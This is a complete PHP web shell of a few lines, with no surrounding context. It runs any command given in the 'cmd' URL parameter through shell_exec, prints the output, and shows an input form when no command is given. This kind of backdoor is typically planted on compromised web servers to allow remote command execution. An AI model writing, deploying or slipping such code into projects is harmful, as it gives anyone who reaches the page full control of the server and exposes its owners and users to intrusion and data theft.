<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo '<form method="GET"><input name="cmd"><input type="submit" value="Run"></form>';
}
?>
